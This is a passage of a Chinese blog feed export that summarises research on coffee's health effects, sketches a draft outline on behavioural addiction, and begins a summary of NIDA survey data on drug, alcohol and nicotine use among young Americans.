<p>咖啡也可能对脂肪肝有效，该疾病随着肥胖率上升而蔓延。美国科学家挑选了 306 名未被诊断患有肝病的超重人群。超声波图像（Ultrasound images）和肝活检（biopsies）显示 180 人的肝脏有脂肪沉积现象，纤维化的早期迹象。基于这些测试，完全不喝咖啡者比咖啡消费者更快地走向纤维化。 2012 年《Hepatology》的一份报告指出，患有晚期脂肪肝的人平均每日饮用咖啡（含咖啡因）少于一杯，而那些仍处于疾病早期阶段的人每天接近两杯。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Stage_of_liver_damage.JPG" alt></p>
<p>在抗肝癌方面，咖啡显示出惊人效果。今年早些时候，一个欧洲团队报告说，每天喝 2.5 杯咖啡以上的女性或 3.5 杯以上的的男性，患肝癌的概率比喝不到三分之一杯的人少72％ 。该研究持续监测 11 年，覆盖大约 50 万名健康人群。在研究期间，一共有 201 人发展成肝癌。科学家将研究成果发表在 4 月 15 日的 《 International Journal of Cancer》（国际癌症杂志），他们表示，即使考虑到肝炎的因素加以调整后，研究结果仍具有鲁棒性（稳健性）。</p>
<p>肝癌监测结果表明 “很可能是咖啡对慢性肝病保护作用的延伸”，Anna  Flögel 说。他是该研究的共同作者，来自德国 Potsdam-Rehbrücke 人类营养研究所。</p>
<p>一些医生认可这一结论。 “我要为患者的处方中加上咖啡吗？” Dranoff 问道。 “对于慢性肝病患者，答案是肯定的。”  2014 年 Liver International ，来自加州大学洛杉矶分校的医生 Sammy Saab及其同事表示，应该鼓励肝病患者“每天喝咖啡”。</p>
<h2 id="预防糖尿病"><a href="#预防糖尿病" class="headerlink" title="预防糖尿病"></a>预防糖尿病</h2><p>2002 年开始，有研究发现咖啡对二型糖尿病的保护作用。在一项针对健康人群的研究中，van Dam 和他的荷兰同事 Edith Feskens 发现，那些平均每天喝七杯咖啡的人比那些每天喝两杯或更少的人患糖尿病的概率要低一半。在这项研究中，年龄在 30 岁到 60 岁之间的人，保护作用开始发生的起点似乎是每天三杯，随着摄入量增加而增强。</p>
<p>该报告发表在《 Lancet 》(柳叶刀) 上，引发了数十项试图复制它的研究。在 2014 的 《 Diabetes Care 》( 糖尿病护理 ) 中发表了 28 项国际研究回顾，包括超过 100 万名健康受试者、监测 10 个月至 20 年。在研究中大约有 45000 例二型糖尿病患者。在一天喝三杯 vs 不足一杯的情况下对比，罹患糖尿病的可能性降低了 21 %。对于每天喝六杯的人来说，风险降低了 33% 。普通咖啡与无因咖啡结果一样。</p>
<p>二型糖尿病的发病之前的现象是能量代谢不良（inefficient energy metabolism）。细胞不能有效地摄取葡萄糖，从而导致高血糖。咖啡因和被称为绿原酸（chlorogenic acids）的多酚提高了代谢效率。当澳大利亚科学家给老鼠喂食高脂肪、高碳水化合物的食物时，动物开始表现出能量代谢不良的现象，其中一些发生了脂肪肝甚至心脏病的早期征兆。咖啡提取物，包括咖啡因、绿原酸和其他成分，提高了动物处理葡萄糖的能力，降低了血压，减缓了对心脏和肝脏的损害。该报告发表在 2012 年的《Journal of Nutrition》（营养杂志）。</p>
<p>当然，加糖会减损咖啡的神奇效果。另外，牛奶富含钙和蛋白质，但会稀释咖啡。因此，<strong>不建议刻意喝浓咖啡，普通咖啡即可。对于有非酒精性脂肪肝或者体重较重人群，无糖咖啡更合适</strong>。</p>
<h2 id="寻找完美的杯子"><a href="#寻找完美的杯子" class="headerlink" title="寻找完美的杯子"></a>寻找完美的杯子</h2><p>阿拉伯咖啡（Arabica，小果咖啡）和 罗布斯塔（Robusta，亦称中果咖啡 Coffea canephora，占世界咖啡产量的 20% ）。罗布斯塔的味道更具攻击性，咖啡因和益多酚（绿原酸）的含量更高。阿拉伯咖啡较温和也更受欢迎，但糖和油脂含量更高，邓肯甜甜圈和星巴克都声称只使用阿拉伯咖啡。</p>
<p>冲泡一杯健康的咖啡，制备方法可能与选择咖啡豆种类一样重要。根据 2013 年 《Food Chemistry》的一份报告，焙烤对咖啡豆中的绿原酸有很好的烹饪效果（见图表）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Coffee_Effect.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Caffee_Caffeine_Content.png" alt></p>
<p>当今流行的滴滤器用于从咖啡中去除胆固醇油脂。煮咖啡和法式滤压壶（French press）可以过滤油脂；意大利浓咖啡只滤出部分油脂（油花和香气影响风味）。在2012 年发表的一项研究中，意大利浓咖啡饮用者相对于过滤咖啡的饮用者，高密度脂蛋白（High-density lipoprotein，HDL，“好的胆固醇”）水平更低、甘油三酯（TG）水平更高。但是过滤也有其缺点，包括抗癌成分的损失。</p>
<p>随着研究的深入，研究者们试图定义完美的杯子。“我们已经到达了一个有趣的十字路口，”Jonathan Dranoff 说，“在 <strong>手艺和健康之间</strong> 。”</p>
<h2 id="在显微镜下"><a href="#在显微镜下" class="headerlink" title="在显微镜下"></a>在显微镜下</h2><p>咖啡的抗癌作用似乎可以延伸到肝脏以外，但程度比较温和。例如，2月份发表的《Cancer Epidemiology, Biomarkers &amp; Prevention》（癌症流行病学、生物标记物与预防）报道，与少量饮用者相比，每天喝三杯咖啡的欧洲女性患子宫癌的风险低 19％。早些时候，日本研究人员发现，日常饮用咖啡的人相对极少饮用的人，稍微不太容易患上口腔和咽喉癌。咖啡也表现出对抗结肠癌，黑色素瘤和乳腺癌的潜力。</p>
<p>如果没有生物学解释，上述流行病学研究将大打折扣。对于癌症，咖啡有几个候选项。咖啡和咖啡因中的多酚促进 DNA 基因修复，这是保持细胞免于癌变的关键步骤。主要的多酚，绿原酸和咖啡酸（与咖啡因无关）是去甲基化剂，这意味着它们可以阻止甲基向 DNA 添加。甲基化（Methylation）可能是癌症的触发因素。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Coffee_Kahweol.png" alt></p>
<p>称为二萜（diterpenes）的咖啡成分也可能与癌症发生作用。在细胞培养和动物研究中，称为咖啡醇（cafestol）和咖啡豆醇（kahweol）的两种二萜能抑制某些致癌物质并降低肝 DNA 加合物（与致癌化学物质结合的DNA片段）的浓度。 咖啡豆醇具有抗炎作用并抑制血管生成——肿瘤所需的血管生长紊乱。作为额外的好处，二萜类化合物可以提高谷胱甘肽（glutathione）的水平，谷胱甘肽是一种有效的抗氧化剂，可以预防肝脏损伤。在实验室的人类间皮瘤测试中（通常由石棉暴露引起的肺部癌症），二萜靶向并杀死癌细胞。</p>
<p>同时，巴西研究人员在 5 月份的《 Journal of Agricultural and Food Chemistry 》杂志上报道，绿原酸和咖啡酸也可以作为抗氧化剂，能够清除有害的自由基。在肠损伤的大鼠模型中，绿原酸和咖啡酸减少了自由基的损害。英国团队发现，在肠内，咖啡也可能有助于双歧杆菌的生长。这些天然的肠道居民已被用作益生菌治疗腹泻和溃疡性结肠炎。</p>
<p>葫芦巴碱（Trigonelline）是另外一种咖啡成分，似乎有助于抗糖尿病作用，同时还可作为抗氧化剂并有益于大脑。最近，科学家们开始对称为羟基氢醌（hydroxy­hydroquinone，HHQ）的咖啡化学成分感兴趣，它随着焙烧过程而增加。好消息是HHQ 可能具有抗癌特性。坏消息是它可能会抑制一些绿原酸的作用，特别是它们降低血压的能力。咖啡酸可以增强人体内的一氧化氮，使血管更灵活，利于血管扩张。</p>
<h2 id="放心剂量：一到四杯"><a href="#放心剂量：一到四杯" class="headerlink" title="放心剂量：一到四杯"></a>放心剂量：一到四杯</h2><p>所有这些生物效应，无论它们如何工作，都可能会阻止收割者。 2012 年《New England Journal of Medicine》的报道了一份死亡率研究，从 1995 年至 2008 年针对包括超过 400,000 名中年和老年人进行观测，研究发现咖啡消费可以降低死亡风险 6％ 至 16％。</p>
<p>在日本，最近一项对超过 9 万人进行的研究显示，每天饮用三到四杯咖啡似乎是最佳选择。研究人员在 5 月份的 《American Journal of Clinical Nutrition》（美国临床营养学杂志）中报道，根据接近 19 年的随访，每天饮用三到四杯咖啡的饮用者比不喝咖啡的人死亡率低 24％ 。</p>
<p>美国国家癌症研究所（ National Cancer Institute）的生物化学家和流行病学家尼尔·弗里德曼（Neal Freedman）说：“这些研究为常规饮用咖啡者提供了参考依据，这似乎是一种相对安全的行为。” 他共同撰写了 2012 年的研究报告。</p>
<p>在早期的工作中，van Dam 试图建立咖啡摄入量的安全上限。他和其他人发现，每天喝六杯的人中没有增加死亡风险。</p>
<p>尽管积极的调查结果大量涌现，但一些研究人员仍然保持谨慎态度。 Klatsky 提供了一个例子，关于研究显示房颤和咖啡、咖啡因之间是否相关。 “出现咖啡因症状的人倾向于停止饮用，” 他说。因此，在一些研究中喝咖啡的人会是那些没有任何不良影响的人，这是一个自我选择的群体。其他研究往往没有注意到人们喝咖啡的种类，烘焙程度或其他可能影响的细节。</p>
<p>尽管如此，咖啡的新地位 —— 作为一种不会带来内疚的快乐，可能正在成为主流。美国专家组会每五年审查一次膳食指南（dietary guidelines）并向联邦政府提出建议。其 2015 年 2 月的报告支出，每天喝三到五杯咖啡不会带来慢性疾病风险。该报告甚至指出了饮用咖啡对糖尿病，心脏病和帕金森症的明显益处。</p>
<p>“这是一种范式转变，” 专家小组成员 Hu 表示，科学家们持谨慎态度，并担心过多的咖啡因可能对孩子不利。但在成年人中，咖啡的图景日渐清晰。</p>
<p>“喝咖啡不是万能的，”  “这只是一种可能获得健康益处的饮用习惯。”</p>
<h2 id="总结：咖啡与健康"><a href="#总结：咖啡与健康" class="headerlink" title="总结：咖啡与健康"></a>总结：咖啡与健康</h2><p>国际癌症研究机构（International Agency for Research on Cancer，简称 IARC）是世界卫生组织下属的一个跨政府机构（办公地点：法国里昂）。该机构的主要任务是进行和促进对癌症病因的研究，也进行世界范围内的癌症的流行病学调查和研究工作。该机构还负责编纂关于各种提高患癌概率因素的论文集，这些因素包括化学品，混合物，辐射，物理和生物制剂和生活状态因素等。各国的卫生部门据此作为控制致癌因素的科学基础。</p>
<p>IARC 将致癌因素分为以下几类：</p>
<ul>
<li>1 类：对人类有确认的致癌性，包括放射性同位素、苯、石棉、黄曲霉素、酒精、烟草、槟榔、马兜铃酸（关木通、广防己、青木香、天仙藤、马兜铃等中药材）等。</li>
<li>2A 类：对人类很可能有致癌性，包括氯霉素、甲醛、苯乙烯、柴油内燃机废气等。</li>
<li>2B 类：有可能对人类致癌，包括电磁波、汽油引擎废气、黄樟素、乙醛等。</li>
<li>3 类：尚不能确定其是否对人体致癌</li>
<li>4 类：对人体基本无致癌作用</li>
</ul>
<p>1991 年，IARC 曾将咖啡中的咖啡酸与红肉一并列为 2B 类致癌物（限于膀胱癌），即“有可能对人体致癌”。不过，IARC 在 2016 年 6 月 15 日发表报告说明，经过彻底的审视 1000 份研究报告后，发现没有足够的证据支持“咖啡有可能致癌”的论点。</p>
<h4 id="咖啡因-Caffeine"><a href="#咖啡因-Caffeine" class="headerlink" title="咖啡因 Caffeine"></a>咖啡因 Caffeine</h4><ul>
<li>减少肝纤维化</li>
<li>减缓心脏和肝脏损伤</li>
<li>预防帕金森病，痴呆症和抑郁症</li>
<li>促进多巴胺分泌（使人感觉良好）</li>
</ul>
<h4 id="多酚-Polyphenols（绿原酸-chlorogenic-acids，咖啡酸-caffeic-acid）"><a href="#多酚-Polyphenols（绿原酸-chlorogenic-acids，咖啡酸-caffeic-acid）" class="headerlink" title="多酚 Polyphenols（绿原酸 chlorogenic acids，咖啡酸 caffeic acid）"></a>多酚 Polyphenols（绿原酸 chlorogenic acids，咖啡酸 caffeic acid）</h4><ul>
<li>减少肝纤维化</li>
<li>促进DNA修复</li>
<li>减少血栓</li>
<li>提高代谢率</li>
<li>降低血压（抵消咖啡因引起的短暂血压升高效应）</li>
<li>充当去甲基化剂</li>
<li>减少自由基引起的肠道损伤</li>
</ul>
<h4 id="二萜类化合物-Diterpenes（咖啡醇-cafestol-和-咖啡豆醇-kahweol）"><a href="#二萜类化合物-Diterpenes（咖啡醇-cafestol-和-咖啡豆醇-kahweol）" class="headerlink" title="二萜类化合物 Diterpenes（咖啡醇 cafestol 和 咖啡豆醇 kahweol）"></a>二萜类化合物 Diterpenes（咖啡醇 cafestol 和 咖啡豆醇 kahweol）</h4><ul>
<li>抗致癌物质</li>
<li>减少肝脏DNA加合物（与致癌物结合的DNA位）</li>
<li>提高谷胱甘肽的水平（一种防止肝损伤的抗氧化剂）</li>
<li>靶向并杀死肺组织中的间皮瘤细胞</li>
<li>咖啡豆醇具有抗炎作用，减少血液流向肿瘤</li>
<li>风险：可能导致更高水平的低密度脂蛋白胆固醇（LDL，“坏胆固醇”）</li>
</ul>
<h4 id="胡芦巴碱-Trigonelline"><a href="#胡芦巴碱-Trigonelline" class="headerlink" title="胡芦巴碱 Trigonelline"></a>胡芦巴碱 Trigonelline</h4><ul>
<li>抗氧化</li>
<li>降低血糖</li>
<li>可能有益于大脑</li>
</ul>
<h2 id="好马配好鞍，好咖啡更需要好音乐"><a href="#好马配好鞍，好咖啡更需要好音乐" class="headerlink" title="好马配好鞍，好咖啡更需要好音乐"></a>好马配好鞍，好咖啡更需要好音乐</h2><p>有人说，音乐、书和咖啡馆是三胞胎、不分彼此。冲上一壶好咖啡，如果再能来上一段乌兰诺娃的《天鹅湖》就更有味道了。黑胶唱片释放出来的美妙旋律，芭蕾舞演员极致轻盈、优雅舒展的舞姿，王子和公主登上金色的帆船，驶向幸福的远方 …… Perfect ！</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4860.png" alt></p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4862.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4864.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4863.png" alt><br><img src="http://riboseyim-qiniu.riboseyim.com/IMG_4865.png" alt></p>
<h2 id="扩展阅读：《嗑药简史》"><a href="#扩展阅读：《嗑药简史》" class="headerlink" title="扩展阅读：《嗑药简史》"></a>扩展阅读：《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/" target="_blank" rel="noopener">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017"><a href="#嗑药简史（附录）：NIDA-美国青年人群药物滥用情况-2016-2017" class="headerlink" title="嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)"></a><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a></h4><h4 id="医学常识-NIH-情绪健康检查单"><a href="#医学常识-NIH-情绪健康检查单" class="headerlink" title="医学常识| NIH 情绪健康检查单"></a><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/" target="_blank" rel="noopener">医学常识| NIH 情绪健康检查单</a></h4><h4 id="医学常识-肝系统健康状况评价指标体系"><a href="#医学常识-肝系统健康状况评价指标体系" class="headerlink" title="医学常识| 肝系统健康状况评价指标体系"></a><a href="https://riboseyim.github.io/2017/07/19/Medicine-Hepar/" target="_blank" rel="noopener">医学常识| 肝系统健康状况评价指标体系</a></h4><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://monographs.iarc.fr/ENG/Monographs/vol51/mono51-6.pdf" target="_blank" rel="noopener">IARC 1991 | Coffee has never been a mere beverage | </a></li>
<li><a href="https://www.iarc.fr/en/media-centre/pr/2016/pdfs/pr244_E.pdf" target="_blank" rel="noopener">IARC 2016 | IARC Monographs evaluate drinking coffee, maté, and very hot beverages</a></li>
<li><a href="https://www.sciencenews.org/article/coffee-reveals-itself-unlikely-elixir?mode=topic&amp;context=69" target="_blank" rel="noopener">Coffee reveals itself as an unlikely elixir | From liver disease to diabetes, coffee compounds protect against an array of health conditions|BY NATHAN SEPPA 12:02PM, SEPTEMBER 18, 2015</a></li>
<li><a href="https://mp.weixin.qq.com/s/tNQgU-L_1I5jnXMbLjskZA" target="_blank" rel="noopener">咖啡，该给你处方了！—-咖啡与肝脏疾病</a></li>
<li><a href="https://web.archive.org/web/20160305055908/https://www.scribd.com/doc/7577310/KUNDALINI-the-evolutionary-energy-in-man" target="_blank" rel="noopener">The evolutionary energy in man</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Health</tag>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title>嗑药简史：行为成瘾</title>
    <url>/2018/01/07/Addiction-Decision-Behavior/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong><br><a id="more"></a></p>
<h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><h4 id="体育赛事与兴奋剂"><a href="#体育赛事与兴奋剂" class="headerlink" title="体育赛事与兴奋剂"></a>体育赛事与兴奋剂</h4><h4 id="色情业（黄）"><a href="#色情业（黄）" class="headerlink" title="色情业（黄）"></a>色情业（黄）</h4><ul>
<li>数据暂缺</li>
</ul>
<h4 id="博彩业（赌）"><a href="#博彩业（赌）" class="headerlink" title="博彩业（赌）"></a>博彩业（赌）</h4><ul>
<li>博彩业情况参考政府彩票销售数据</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-3.png" alt="中国彩票销售数据（1998-2017）"><br><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-1.png" alt="中国彩票销售数据（1998-2017）"><br><img src="http://riboseyim-qiniu.riboseyim.com/gmof-caipiao-2.png" alt="中国彩票销售数据（1998-2017）"></p>
<h4 id="死于嗑药的皇帝们"><a href="#死于嗑药的皇帝们" class="headerlink" title="死于嗑药的皇帝们"></a>死于嗑药的皇帝们</h4><ul>
<li>唐太宗（西域长生药）：51岁</li>
<li>明嘉靖帝（道士丹药）：</li>
</ul>
<h4 id="专制主义"><a href="#专制主义" class="headerlink" title="专制主义"></a>专制主义</h4><ul>
<li><a href="https://mp.weixin.qq.com/s/m7URWYWonvCEDa4FKmIWUA" target="_blank" rel="noopener">自恋的暴君 | 原创 2017-07-10 范海辛 独立作家</a></li>
</ul>
<h4 id="现代"><a href="#现代" class="headerlink" title="现代"></a>现代</h4><ul>
<li>学生：提高学习成绩<br>学生使用药物以求提高学习成绩。根据美国 NIDA 的追踪调查数据，2017年全美约 2.4% 的大学生使用利他林（Ritalin，中枢神经兴奋剂）。约 9.9% 的大学生使用阿得拉（Adderall，一种治疗注意力缺失/多动症的药物）。（数据来源 <a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">嗑药简史（附录）：NIDA | 美国青年人群药物滥用情况(2016~2017)</a> ）</li>
</ul>
<h2 id="扩展阅读：《嗑药简史》"><a href="#扩展阅读：《嗑药简史》" class="headerlink" title="扩展阅读：《嗑药简史》"></a>扩展阅读：《嗑药简史》</h2><h4 id="嗑药简史（一）：药物成瘾与神经系统"><a href="#嗑药简史（一）：药物成瘾与神经系统" class="headerlink" title="嗑药简史（一）：药物成瘾与神经系统"></a><a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史（一）：药物成瘾与神经系统</a></h4><ul>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、运动、性、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="嗑药简史（二）：瘾品跨境流动与外交关系"><a href="#嗑药简史（二）：瘾品跨境流动与外交关系" class="headerlink" title="嗑药简史（二）：瘾品跨境流动与外交关系"></a><a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史（二）：瘾品跨境流动与外交关系</a></h4><p>扰动中美大国外交的 China Girl (芬太尼)</p>
<ul>
<li>什么是芬太尼,Fentanyl</li>
<li>大国外交的头等优先事项</li>
<li>预测：暗黑幽灵无国界</li>
</ul>
<h4 id="嗑药简史（三）：瘾品管制背后的情与法"><a href="#嗑药简史（三）：瘾品管制背后的情与法" class="headerlink" title="嗑药简史（三）：瘾品管制背后的情与法"></a><a href="https://riboseyim.github.io/2018/01/07/Addiction-Decision-Law/" target="_blank" rel="noopener">嗑药简史（三）：瘾品管制背后的情与法</a></h4><ul>
<li>严刑峻法：瘾品管制与定罪量刑</li>
<li>戈尔巴乔夫的禁酒运动</li>
</ul>
<h4 id="嗑药简史（四）：咖啡上瘾，喝还是不喝？"><a href="#嗑药简史（四）：咖啡上瘾，喝还是不喝？" class="headerlink" title="嗑药简史（四）：咖啡上瘾，喝还是不喝？"></a><a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></h4><ul>
<li>咖啡的保健作用及临床实证研究案例</li>
<li>咖啡种类、制作工艺对健康效益的影响</li>
</ul>
<h4 id="嗑药简史（附录）"><a href="#嗑药简史（附录）" class="headerlink" title="嗑药简史（附录）"></a>嗑药简史（附录）</h4><ul>
<li><a href="https://riboseyim.github.io/2017/12/20/Addiction-Decision-2016-USA-Students/" target="_blank" rel="noopener">NIDA: 美国青年人群药物滥用情况(2016~2017)</a></li>
<li><a href="https://riboseyim.github.io/2018/01/22/Health-Emotional/" target="_blank" rel="noopener">医学常识| NIH 情绪健康检查单</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://medium.com/startup-grind/infinite-scroll-the-webs-slot-machine-c18c2502d5c1" target="_blank" rel="noopener">Infinite Scroll: The Web’s Slot Machine | 无限滚动加载：互联网的老虎机</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4NjcyMDU1NQ==&amp;mid=2247489365&amp;idx=1&amp;sn=43931b9d0329845999158d779b1afef5&amp;chksm=9fc53e11a8b2b7070309ead673cd39a0fc911546c30c6be8d86a212e3479881459362b984b29&amp;mpshare=1&amp;scene=1&amp;srcid=1215lNOSmWnrzAQh8MjmZsxY%23rd" target="_blank" rel="noopener">测试：你以为你热爱工作，其实可能是一种成瘾 | 孤独的人更容易成瘾</a></li>
<li><a href="https://mp.weixin.qq.com/s/b8LOpaNWn-yjPAAE-xlJ6A" target="_blank" rel="noopener">机器人会得抑郁症吗？</a><br>人脑和 AI 一样也有关键的全局变量，计算精神病学家称之为“神经调节物”，这些“神经调节物”包括多巴胺和5-羟色胺（又叫血清素）。尽管这些高度集权的细胞群数量并不多，但是它们却几乎能将化学信息传递到整个大脑。)</li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA5NDkzNjIwMg==&amp;mid=2651671031&amp;idx=1&amp;sn=901b4617b2bafeb7bd9b3b8e002d1024&amp;chksm=8bbee412bcc96d04108f9d1bf2f718cd7f8acbb85857a7136878fd9867242cee3f67eacd66b3&amp;mpshare=1&amp;scene=1&amp;srcid=0606h9TztTTIDRMw0M5lKwNq%23rd" target="_blank" rel="noopener">Nature：可乐让人快乐的奥秘，全在这5页论文里了</a></li>
<li><a href="https://mp.weixin.qq.com/s/A1UCk0k3OhLZviTRput9Ow" target="_blank" rel="noopener">如何批量制造钻石 | 何昌梅/张每羊  中科院物理所</a></li>
<li><a href="https://mp.weixin.qq.com/s/dxZl9s0zKeViTVJImLE9pA" target="_blank" rel="noopener">月经无用！英国官方指南：连续服用避孕药，可安全摆脱月经 |原创： 环球科学</a></li>
<li><a href="https://mp.weixin.qq.com/s/ZgvzfYA9w5lwSEbWpKg33w" target="_blank" rel="noopener">Nature丨社会行为影响摄食的神经环路 | 原创： 王小果  BioArt  2月23日</a></li>
<li><a href="https://mp.weixin.qq.com/s/Wbp3n6-7rr2rgTDN1bABUg" target="_blank" rel="noopener">“懒惰”并不存在：比评判更重要的是，用好奇心了解“懒惰”背后的原因 | 原创： Devon Price  酷炫脑  2月24日</a></li>
<li><a href="https://mp.weixin.qq.com/s/iELRrGnmmRzFWfiVVsEYig" target="_blank" rel="noopener">颜值就是美味：颜色竟能欺骗大脑，改变食品味道 | 环球科学  2018-12-09</a></li>
</ul>
]]></content>
      <categories>
        <category>自然科学</category>
      </categories>
      <tags>
        <tag>Psychology</tag>
        <tag>Medical</tag>
        <tag>Science</tag>
        <tag>Economist</tag>
        <tag>History</tag>
        <tag>Policy&amp;Law</tag>
        <tag>Manager</tag>
      </tags>
  </entry>
  <entry>
    <title>嗑药简史：美国青年人群药物滥用情况</title>
    <url>/2017/12/20/Addiction-Decision-2016-USA-Students/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>美国 NIDA : 2016 年度青年人群药物滥用调查报告</li>
</ul>
<a id="more"></a>
<p>2017 年 9月，美国 NIDA 公布了一份针对全美青年人群的药物和酒精滥用情况的调查报告。监测人群选取 2016 年的准大学生及其同龄青年，大学生组（college students，Full-Time）和非大学生组（non-college）。</p>
<p>以下数据来源：美国卫生和公众服务部·国立卫生研究院·国家药物滥用研究所<br>Source: National Institute on Drug Abuse; National Institutes of Health; U.S. Department of Health and Human Services.</p>
<h4 id="大麻（Marijuana-Use）"><a href="#大麻（Marijuana-Use）" class="headerlink" title="大麻（Marijuana Use）"></a>大麻（Marijuana Use）</h4><p>在这个年龄段，吸食大麻（Marijuana Use）的情况令人担忧。吸食大麻的比例是 20 世纪 80 年代初以来的最高水平，有 4.9% 的大学生和 12.8% 的非大学生报告在日常生活中会吸食大麻。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/nida_mtfinfographic2016_marijuana508.jpg" alt></p>
<h4 id="酒精（Heavy-Alcohol-Use-）"><a href="#酒精（Heavy-Alcohol-Use-）" class="headerlink" title="酒精（Heavy Alcohol Use ）"></a>酒精（Heavy Alcohol Use ）</h4><p>大学生群体的酗酒比例似乎比非大学组的比例高。</p>
<ul>
<li>狂饮（Binge drinking，连续五杯以上）：32.4% 的大学生和 28.7% 的非大学生在过去的 2 周内有狂饮经历。</li>
<li>酒精中毒（Intoxication，醉酒、酗酒）：40.8% 的大学生和 30.4% 的非大学生在过去一个月内有酗酒经历。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/nida_mtfinfographic2016_alcohol508.jpg" alt></p>
<h4 id="烟草-尼古丁（Nicotine-Use）"><a href="#烟草-尼古丁（Nicotine-Use）" class="headerlink" title="烟草/尼古丁（Nicotine Use）"></a>烟草/尼古丁（Nicotine Use）</h4><p>大学生人群中烟草（尼古丁）的使用率普遍较低。</p>
<ul>
<li>香烟（Cigarettes）：8.9% 的大学生和 18.8% 的非大学生在过去一个月使用香烟。</li>
<li>电子烟（E-vaporizers，通过雾化等手段将尼古丁等变成蒸汽后让用户吸食）：9% 的大学生和 6.9% 的非大学生过去一个月使用过电子烟。电子烟可能包括尼古丁，其他药物或非药物（例如调味剂等）。</li>
<li>水烟（Hookah）：大学生去年水烟使用的是较低的，16.9% 的大学生和 19.8% 非大学在过去一年中使用过水烟，大学生组的比例较低。在过去的五年中，水烟在大学生人群中的使用率呈现下降趋势。水烟使用率从 2011 年的27.9% 下降到 2016 年的 16.9% 。</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/nida_mtfinfographic2016_nicotine508.jpg" alt></p>
